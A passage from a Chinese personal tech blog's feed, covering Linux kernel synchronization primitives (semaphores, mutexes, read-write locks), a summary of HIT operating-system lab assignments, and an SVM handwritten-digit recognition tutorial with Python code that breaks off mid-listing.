linux引入的命名问题；这里我们只需要明白：尽可能使用spin_lock；绝对不允许被抢占和休眠的地方，使用raw_spin_lock，否则使用spin_lock，信号量的底层，使用了自旋锁来实现。</p><p>信号量的后两个域，<code>count</code>和<code>wait_list</code>分别是现有资源数和等待获取资源的进程序列。对于信号量，内核定义了这些API：</p><pre><code>void down(struct semaphore *sem);void up(struct semaphore *sem);int  down_interruptible(struct semaphore *sem);int  down_killable(struct semaphore *sem);int  down_trylock(struct semaphore *sem);int  down_timeout(struct semaphore *sem, long jiffies);</code></pre><p>这里看看<code>down</code>函数：</p><pre><code>void down(struct semaphore *sem){    unsigned long flags;    raw_spin_lock_irqsave(&amp;sem-&gt;lock, flags);    if (likely(sem-&gt;count &gt; 0))            sem-&gt;count--;    else            __down(sem);    raw_spin_unlock_irqrestore(&amp;sem-&gt;lock, flags);}</code></pre><p>可以看到，这里自旋锁的作用实际上是保证count不被同时操作；而如果count大于0，则可以减少它的值，表示获取了这个锁，否则会<code>__down_common</code>，这个函数在不发生错误大情况下，会调用这样一段函数：</p><pre><code>raw_spin_unlock_irq(&amp;sem-&gt;lock);timeout = schedule_timeout(timeout);raw_spin_lock_irq(&amp;sem-&gt;lock);</code></pre><p>这个函数是在timer.c代码中定义的。<code>schedule_timeout</code>函数将当前的任务置为休眠到设置的超时为止，这也就是信号量和自旋锁不同之处了，它允许进程的休眠。</p><p>而对于<code>up</code>函数来说，释放锁，增加count之后，会马上会检查是否有进程在等待资源：</p><pre><code>static noinline void __sched __up(struct semaphore *sem){    struct semaphore_waiter *waiter = list_first_entry(&amp;sem-&gt;wait_list,                                            struct semaphore_waiter, list);    list_del(&amp;waiter-&gt;list);    waiter-&gt;up = true;    wake_up_process(waiter-&gt;task);}</code></pre><p>这样看来，其实信号量和自旋锁最大的不同就只有两个：自旋锁的忙等与信号量的休眠，资源的数量。</p><h1>互斥量</h1><p>虽然《深入理解linux内核》这本书中没有写，但是内核中也是有互斥量的；实际上它相当于count ＝ 1的信号量。互斥量的定义为：</p><pre><code>struct mutex {    atomic_t                count;    spinlock_t              wait_lock;    struct list_head        wait_list;#if defined(CONFIG_DEBUG_MUTEXES) || defined(CONFIG_MUTEX_SPIN_ON_OWNER)    struct task_struct      *owner;#endif#ifdef CONFIG_MUTEX_SPIN_ON_OWNER    struct optimistic_spin_queue osq;#endif#ifdef CONFIG_DEBUG_MUTEXES    void                    *magic;#endif#ifdef CONFIG_DEBUG_LOCK_ALLOC    struct lockdep_map      dep_map;#endif};</code></pre><p>可以看到它同样依赖于自旋锁实现，也包含一个进程的等待队列。我们来看看互斥量的上锁操作：</p><pre><code>void __sched mutex_lock(struct mutex *lock){    might_sleep();    __mutex_fastpath_lock(&amp;lock-&gt;count, __mutex_lock_slowpath);    mutex_set_owner(lock);}这里__mutex_fastpath_lock最终会调用一段汇编代码：asm_volatile_goto(LOCK_PREFIX &quot;   decl %0\n&quot;                          &quot;   jns %l[exit]\n&quot;                          : : &quot;m&quot; (v-&gt;counter)                          : &quot;memory&quot;, &quot;cc&quot;                          : exit);</code></pre><p>也就是原子操作，修改mutex的counter，而mutex中的自旋锁，是为了保护<code>wait_list</code>而存在的，只是起到一个辅助作用，这点和信号量不太一样。</p><h1>读写自旋锁/顺序锁/信号量</h1><p>为了增加内核到并发能力，操作系统还设置了读写自旋锁。读写自旋锁允许多个内存控制路径，同时<strong>读</strong>同一个数据结构，但如果相对这个结构进行写操作，那么它必须首先获取读写自旋锁的写锁，写锁能让当前的路径独占访问这个资源。</p><p>顺序锁则是允许读者在读的同时进行写操作，因此写操作永远不会等待，但这样读操作有时候必须重复读多次，直到读到有效的副本为止。<br> 读写信号量则和读写自旋锁类似，只不过它以挂起代替自旋。</p><h1>禁止本地中断/可延迟函数</h1><p>在前面提到的原语中，很多在实现的时候，都禁止了了本地的中断，这就保证了当前内核控制路径能够继续执行，例如<code>raw_spin_lock_irqsave</code>和<code>raw_spin_lock_irqrestore</code>。不过禁止本地中断不能阻止其他CPU 访问共享数据，因此通常和自旋锁结合使用。</p><p>而可延迟函数同样可以禁止和激活，这是由preempt_count字段中的值决定的。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/e41a0c57/">http://home.meng.uno/articles/e41a0c57/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      内核同步
对于内核，其实有一个很形象的理解：我们可以把内核理解成一个服务器，它为自身和用户提供各种服务。因此它必须要保证每项服务在处理时，不会互相造成影响，也就是解决“并发”的问题。自身的请求，也即中断；客户的请求，也即用户态的系统调用或异常。内核的同步，就是对内核中的任务进行调度，使它们按照正确的方式运行。

内核抢占
这里，“内核抢占”指的是进程A在内核态运行时，被具有更高优先级的进程B取代，也就是发生了进程上下文的切换。而我们知道，中断上下文是不包括进程信息的，不能被调度。所以只要在中断上下文中，就不能进行“进程切换”。因此硬中断和软中断在执行时都不允许内核抢占；只有在内核执行异常处理程
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="Linux" scheme="http://home.meng.uno/tags/Linux/"/>
    
      <category term="内核同步" scheme="http://home.meng.uno/tags/%E5%86%85%E6%A0%B8%E5%90%8C%E6%AD%A5/"/>
    
  </entry>
  
  <entry>
    <title>HIT操作系统实验总结</title>
    <link href="http://home.meng.uno/articles/86743755/"/>
    <id>http://home.meng.uno/articles/86743755/</id>
    <published>2017-01-04T12:50:26.000Z</published>
    <updated>2020-12-02T02:00:41.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>哈工大《操作系统》六次实验每次需要修改的文件见：<a href="http://www.meng.uno/utils/os.html" target="_blank" rel="noopener">修改文件列表</a> 本实验总结源自github项目：    <a href="https://github.com/HITAmigos/MIC" target="_blank" rel="noopener">MIC</a></p></blockquote><h2 id="操作系统引导">操作系统引导</h2><h3 id="bootsect-s">bootsect.s</h3><ul>  <li>实现屏幕输出</li>  <li>修改打印的字符串（空白也算作一个字符）</li>  <li>读入setup.s代码（包括：设置驱动器、磁头，读取setup.s的磁道和扇区，并跳到相应位置开始执行）</li></ul><h3 id="setup-s">setup.s</h3><ul>  <li>（和bootsect.s中部分代码相同）打印相关信息</li>  <li>（原代码已经可以部分打印硬件信息）需要在相关位置嵌入msg实现打印提示信息功能</li></ul><h3 id="build-c">build.c</h3><ul>  <li>将bootsect.s、setup.s、system.s编译、链接生成Image文件</li></ul><h2 id="系统调用">系统调用</h2><ul>  <li>unistd.h文件：添加系统调用功能号</li>  <li>sys.h声明新的系统调用处理函数；添加系统调用处理程序索引值到指针数组表中</li>  <li>system_call.s中增加系统调用总数</li>  <li>makefile添加新的系统调用所在文件的编译链接规则（依赖关系）</li></ul><h2 id="进程运行轨迹的跟踪与统计">进程运行轨迹的跟踪与统计</h2><h3 id="process-c">process.c</h3><ul>  <li>涉及到fork()和wait()系统调用</li>  <li>主要实现了一个函数——cpuio_bound()</li>  <li>用fork()建立若干个同时运行的子程序</li>  <li>父P等待所有子P退出后才退出，每个子P性质通过cpuio_bound()控制性质</li></ul><h3 id="fork-c">fork.c</h3><ul>  <li>fork系统调用函数</li></ul><h3 id="main-c">main.c</h3><ul>  <li>内核的入口函数main()，对它的修改是增加日志创建语句，并将log文件关联到文件描述符log文件记录进程状态转换轨迹</li></ul><h3 id="kernel">kernel</h3><p>主要寻找进程状态转换点：</p><ul>  <li>printk.c</li>  <li>sched.c</li>  <li>exit.c</li></ul><h2 id="信号量的实现和应用">信号量的实现和应用</h2><h3 id="sem-open">sem_open</h3><ul>  <li>打开信号量</li></ul><h3 id="sem-wait">sem_wait</h3><ul>  <li>信号量P操作——value–</li></ul><h3 id="sem-post">sem_post</h3><ul>  <li>信号量V操作——value++</li></ul><h3 id="sem-unlink">sem_unlink</h3><ul>  <li>释放信号量</li></ul><h2 id="地址映射与共享">地址映射与共享</h2><h3 id="shm-c">shm.c</h3><ul>  <li>shmget()：得到一个共享内存标识符或创建一个共享内存对象并返回共享内存标识符</li>  <li>shmat()：连接共享内存标识符为shmid的共享内存，连接成功后把共享内存区对象映射到调用进程的地址空间，随后可像本地空间一样访问</li></ul><h3 id="sem-c">sem.c</h3><p>实现信号量的四种操作，与实验四相同</p><h2 id="字符显示的控制">字符显示的控制</h2><h3 id="keyboard-s">keyboard.S</h3><ul>  <li>添加对字符F12的输入判断</li></ul><h3 id="console-c">console.c</h3><ul>  <li>添加输出到控制台的字符控制</li></ul><h3 id="file-dev-c">file_dev.c</h3><ul>  <li>添加输出到文件的字符控制</li></ul><p><br><br>本文链接： <a href="http://home.meng.uno/articles/86743755/">http://home.meng.uno/articles/86743755/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      哈工大《操作系统》六次实验每次需要修改的文件见：修改文件列表 本实验总结源自github项目： MIC

操作系统引导
bootsect.s
 * 实现屏幕输出
 * 修改打印的字符串（空白也算作一个字符）
 * 读入setup.s代码（包括：设置驱动器、磁头，读取setup.s的磁道和扇区，并跳到相应位置开始执行）

setup.s
 * （和bootsect.s中部分代码相同）打印相关信息
 * （原代码已经可以部分打印硬件信息）需要在相关位置嵌入msg实现打印提示信息功能

build.c
 * 将bootsect.s、setup.s、system.s编译、链接生成Image文件

系统
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="操作系统" scheme="http://home.meng.uno/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>手写数字识别（SVM）</title>
    <link href="http://home.meng.uno/articles/7dac38a/"/>
    <id>http://home.meng.uno/articles/7dac38a/</id>
    <published>2016-12-17T04:08:13.000Z</published>
    <updated>2020-12-02T02:07:24.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="调用第三方库">调用第三方库</h2><p>在此我选用的是sk-learn的关于svm的库，其关于此次实验的svm函数定义为： svm.SVC(C=8.0, kernel=‘rbf’, gamma=0.1) svm.SVC()函数的几个重要参数在其官方的介绍文档中有如下的解释： C :误差项的惩罚参数，浮点型，可选 (默认=1.0)； kernel : 指定核函数类型，字符型，可选 (默认=‘rbf’)，如果使用自定义的核函数，需要预先计算核矩阵； gamma : 浮点型, 可选 (默认=0.0)，’rbf’核函数的系数，需要注意的是，此处的gamma与课本中的sigma是互为倒数的关系（所以其可以为0）。  因为是调用别人的库（应该说完全是别人的功劳），所以在实现上没有什么可以说的。</p><h3 id="代码">代码</h3><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre>      </td>      <td class="code">        <pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"><span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">Created on Thu Dec  1 13:30:21 2016</span></span><br><span class="line"><span class="string">@author: kuangmeng</span></span><br><span class="line"><span class="string">使用SVM分类器，从MNIST数据集中进行手写数字识别的分类程序</span></span><br><span class="line"><span class="string">"</span><span class="string">""</span></span><br><span class="line">import cPickle</span><br><span class="line">import gzip</span><br><span class="line">from sklearn import svm</span><br><span class="line">import time</span><br><span class="line">def load_data():</span><br><span class="line">    <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">    返回包含训练数据、验证数据、测试数据的元组的模式识别数据</span></span><br><span class="line"><span class="string">    "</span><span class="string">""</span></span><br><span class="line">    f = gzip.open(<span class="string">'data.gz'</span>, <span class="string">'rb'</span>)</span><br><span class="line">    training_data, validation_data, test_data = cPickle.load(f)</span><br><span class="line">    f.close()</span><br><span class="line">    return (training_data, validation_data, test_data)</span><br><span class="line">def Svm():</span><br><span class="line">    print (<span class="string">"开始时间："</span>,<span class="selector-tag">time</span>.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>)) </span><br><span class="line">    training_data, validation_data, test_data = load_data()</span><br><span class="line">    # 传递训练模型的参数，这里用默认的参数</span><br><span class="line">    clf = svm.SVC(C=<span class="number">10.0</span>, kernel=<span class="string">'rbf'</span>, gamma=<span class="number">0.10</span>,cache_size=<span class="number">8000</span>,probability=False)</span><br><span class="line">    # 进行模型训练</span><br><span class="line">    clf.fit(training_data[<span class="number">0</span>], training_data[<span class="number">1</span>])</span><br><span class="line">    # 测试集测试预测结果</span><br><span class="line">    predictions = [int(a) <span class="keyword">for</span> <span class="selector-tag">a</span> <span class="keyword">in</span> clf.predict(test_data[<span class="number">0</span>])]</span><br><span class="line">    num_correct = sum(int(<span class="selector-tag">a</span> == y) <span class="keyword">for</span> <span class="selector-tag">a</span>, y <span class="keyword">in</span> zip(predictions, test_data[<span class="number">1</span>]))</span><br><span class="line">    print ("%s 中的 %s 测试正确。" % (num_correct, len(test_data[1])))</span><br><span class="line">    print (<span class="string">"结束时间："</span>,<span class="selector-tag">time</span>.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    Svm()</span><br></pre>      </td>    </tr>  </table></figure><h2 id="自己编程实现">自己编程实现</h2><p>在自己编程实现过程中，我也借鉴了很多其他人写的很成熟的方案，最终从数据结构、逻辑结构以及特征计算等方面得到比较合理的一组答案。</p><h3 id="逻辑结构">逻辑结构</h3><p>本次实验的程序分为“训练”和“测试”两部分，两部分分别进行的工作如下：</p><h4 id="训练">训练</h4><p>加载数据 初始化模型 更新标签 初始化预测误差 迭代每个样本（用KT优化） 得到每个样本的模型 对步骤5的解释： 对于svm我们要求解a（数组），如果 a的所有分量满足svm对偶问题的KKT条件，那么这个问题的解就求出来了，我们svm模型学习也就完成了。如果没有满足KKT，那么我们就在 a中找两个分量 ai和 aj，其中 ai 是违反KKT条件最严重的分量，通过计算，使得 ai 和 aj满足KKT条件，直到a的所有分量都满足KKT条件。而且这个计算过程是收敛的，因为每次计算出来的新的两个分量，使得对偶问题中要优化的目标函数值更小。因为每次求解的那两个分量，是要优化问题在这两个分量上的极小值，所以每一次优化，都会使目标函数比上一次的优化结果的值变小。</p><h4 id="测试">测试</h4><p>加载数据 对每个数据预测 计算正确率与相关信息逻辑结构 特征计算 仿照KKT的优化方法，在本次试验中，我将每张图片作为一个数据。由此得到对每一个测试样本的预测（如果在某个分类的计算时结果为正，则说明该测试样本属于该类别，结果为0则不属于此类别）。</p><h3 id="其他杂项">其他杂项</h3><p>核函数选择：按照传统，选择的是RBF核函数，函数形式与教材完全相同； 数据来源：来源自网友整理之后的数据（测试数据与训练数据没有均分）； SMO优化算法： 取初始值a(0)=0，令K=0； 选取优化变量a1(k) , a2(k) , 针对优化问题，求得最优解 a1(k+1) , a2(k+1) 更新 a(k) 为 a(k+1) ； 在精度条件范围内是否满足停机条件，即是否有变量违反KKT条件，如果违反了，则令k=k+1，跳转2，否则4； 求得近似解â =a(k+1) 其中第3步中，是否违反KKT条件，对于a(k)的每个分量按照以下的违反KKT条件的公式进行验算即可。  变量选取分为两步，第一步是选取违反KKT条件最严重的ai，第二步是根据已经选取的第一个变量，选择优化程度最大的第二个变量。 违反KKT条件最严重的变量可以按照这样的规则选取，首先看0&lt;ai&lt;C的那些分量中，是否有违反KKT条件的，如果有，则选取yig(xi)最小的那个做为a1。如果没有则遍历所有的样本点，在违反KKT条件的分量中选取yig(xi)最小的做为a1。 当选择了a1后，如果a1对应的E1为正，选择Ei最小的那个分量最为a2，如果E1为负，选择Ei最大的那个分量最为a2，这是因为anew2依赖于|E1−E2|。  如果选择的a2，不能满足下降的最小步长，那么就遍历所有的支持向量点做为a2进行试用，如果仍然都不能满足下降的最小步长，那么就遍历所有的样本点做为a2试用。如果还算是不能满足下降的最小步长，那么就重新选择a1。</p><h3 id="代码-v2">代码</h3><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre>      </td>      <td class="code">        <pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"><span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">Created on Sun Dec  4 14:24:53 2016</span></span><br><span class="line"><span class="string">@author: kuangmeng</span></span><br><span class="line"><span class="string">"</span><span class="string">""</span></span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">import math</span><br><span class="line">class model:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self<span class="selector-class">.a</span> = []</span><br><span class="line">        self<span class="selector-class">.b</span> = <span class="number">0.0</span>   </span><br><span class="line">class DATA:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.samples = []        # 样本数据</span><br><span class="line">        self.tests = []          # 测试数据</span><br><span class="line">        self.models = []         # 训练的模型</span><br><span class="line">        self.forecasterror = []      # 预测知与真实y之差Ei</span><br><span class="line">        self.modelnum = 0         # 当前正使用或训练的模型</span><br><span class="line">        self.cache= []   # 缓存kernel函数的计算结果</span><br><span class="line">        self.sigma = 10        # sigma</span><br><span class="line">    def init_models(self):</span><br><span class="line">        <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">            m = model()</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(self.samples)):</span><br><span class="line">                m<span class="selector-class">.a</span><span class="selector-class">.append</span>(<span class="number">0</span>)</span><br><span class="line">            self<span class="selector-class">.models</span><span class="selector-class">.append</span>(m)</span><br><span class="line">    def init_cache(self):</span><br><span class="line">        <span class="selector-tag">i</span> = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> self<span class="selector-class">.samples</span>: </span><br><span class="line">            print (<span class="string">"正在计算第"</span>,i+<span class="number">1</span>,<span class="string">"个样本的RBF核"</span>)</span><br><span class="line">            self<span class="selector-class">.cache</span><span class="selector-class">.append</span>([])</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> z <span class="keyword">in</span> self<span class="selector-class">.samples</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="selector-tag">i</span> &gt; j:</span><br><span class="line">                    self<span class="selector-class">.cache</span>[i].append(self<span class="selector-class">.cache</span>[j][i])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self<span class="selector-class">.cache</span>[i].append(RBF(x,z))</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            <span class="selector-tag">i</span> += <span class="number">1</span>                 </span><br><span class="line">class image:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self<span class="selector-class">.data</span> = []</span><br><span class="line">        self<span class="selector-class">.num</span> = <span class="number">0</span></span><br><span class="line">        self<span class="selector-class">.label</span> = []</span><br><span class="line">        self<span class="selector-class">.filename</span> = <span class="string">""</span></span><br><span class="line">gv = DATA()</span><br><span class="line"># RBF核函数</span><br><span class="line">def RBF(j, i):</span><br><span class="line">    <span class="keyword">if</span> j == <span class="selector-tag">i</span>:</span><br><span class="line">        return math.exp(<span class="number">0</span>)</span><br><span class="line">    sigma = gv.sigma</span><br><span class="line">    ret = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> range(len(j.data)):</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> range(len(j<span class="selector-class">.data</span>[m])):</span><br><span class="line">            ret += math.pow(int(j<span class="selector-class">.data</span>[m][n]) - int(<span class="selector-tag">i</span><span class="selector-class">.data</span>[m][n]), <span class="number">2</span>)</span><br><span class="line">    ret = math.exp(-ret/sigma)</span><br><span class="line">    return ret</span><br><span class="line">#加载测试与训练数据</span><br><span class="line">def loaddata(dirpath, name):</span><br><span class="line">    files = os.listdir(dirpath)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        <span class="selector-tag">img</span> = image()</span><br><span class="line">        <span class="selector-tag">img</span><span class="selector-class">.data</span> = images(dirpath + file)</span><br><span class="line">        <span class="selector-tag">img</span><span class="selector-class">.num</span> = int(file[<span class="number">0</span>])</span><br><span class="line">        <span class="selector-tag">img</span><span class="selector-class">.filename</span> = file</span><br><span class="line">        name.append(img)</span><br><span class="line">#图片分列        </span><br><span class="line">def images(path):</span><br><span class="line">    <span class="selector-tag">img</span> = []</span><br><span class="line">    file = open(path, <span class="string">"r"</span>) </span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        line = line[:-<span class="number">2</span>]</span><br><span class="line">        <span class="selector-tag">img</span>.append(line)</span><br><span class="line">    return <span class="selector-tag">img</span>  </span><br><span class="line">#更新样本标签，正在训练啥就将啥的标签定为<span class="number">1</span>，其他的定为-<span class="number">1</span>    </span><br><span class="line">def update_samples_label(num):</span><br><span class="line">    <span class="keyword">for</span> <span class="selector-tag">img</span> <span class="keyword">in</span> gv<span class="selector-class">.samples</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="selector-tag">img</span><span class="selector-class">.num</span> == num:</span><br><span class="line">            <span class="selector-tag">img</span><span class="selector-class">.label</span><span class="selector-class">.append</span>(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="selector-tag">img</span><span class="selector-class">.label</span><span class="selector-class">.append</span>(-<span class="number">1</span>)          </span><br><span class="line">#初始化DATA.forecasterror</span><br><span class="line">def init_forecasterror():</span><br><span class="line">    gv<span class="selector-class">.forecasterror</span> = []</span><br><span class="line">    <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(len(gv.samples)):</span><br><span class="line">        diff = <span class="number">0.0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(gv.samples)):</span><br><span class="line">            <span class="keyword">if</span> gv<span class="selector-class">.models</span>[gv.modelnum]<span class="selector-class">.a</span>[j] != <span class="number">0</span>:</span><br><span class="line">                 diff += gv.models[gv.modelnum].a[j] * gv.samples[j].label[gv.modelnum] * gv.cache[j][i]</span><br><span class="line">        diff += gv<span class="selector-class">.models</span>[gv.modelnum]<span class="selector-class">.b</span> </span><br><span class="line">        diff -= gv<span class="selector-class">.samples</span>[i]<span class="selector-class">.label</span>[gv.modelnum]</span><br><span class="line">        gv<span class="selector-class">.forecasterror</span><span class="selector-class">.append</span>(diff)</span><br><span class="line">#更新DATA<span class="selector-class">.forecasterror</span>        </span><br><span class="line">def update_forecasterror(i, new_ai, j, new_bj, new_b):</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> range(len(gv.samples)):</span><br><span class="line">        diff = (new_ai - gv.models[gv.modelnum].a[i])* gv.samples[i].label[gv.modelnum] * gv.cache[i][idx]</span><br><span class="line">        diff += (new_bj - gv.models[gv.modelnum].a[j])* gv.samples[j].label[gv.modelnum] * gv.cache[j][idx]</span><br><span class="line">        diff += new_b - gv<span class="selector-class">.models</span>[gv.modelnum].b</span><br><span class="line">        diff += gv<span class="selector-class">.forecasterror</span>[idx]</span><br><span class="line">        gv<span class="selector-class">.forecasterror</span>[idx] = diff</span><br><span class="line"># g(x)</span><br><span class="line">def predict(m):</span><br><span class="line">    pred = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(gv.samples)):</span><br><span class="line">        <span class="keyword">if</span> gv<span class="selector-class">.models</span>[gv.modelnum]<span class="selector-class">.a</span>[j] != <span class="number">0</span>:</span><br><span class="line">            pred += gv.models[gv.modelnum].a[j] * gv.samples[j].label[gv.modelnum] * RBF(gv.samples[j],m)</span><br><span class="line">    pred += gv<span class="selector-class">.models</span>[gv.modelnum]<span class="selector-class">.b</span> </span><br><span class="line">    return pred</span><br><span class="line">def save_models():</span><br><span class="line">    <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        fn = open(<span class="string">"models/"</span> + str(i) + <span class="string">"_a.model"</span>, <span class="string">"w"</span>)</span><br><span class="line">        <span class="keyword">for</span> ai <span class="keyword">in</span> gv<span 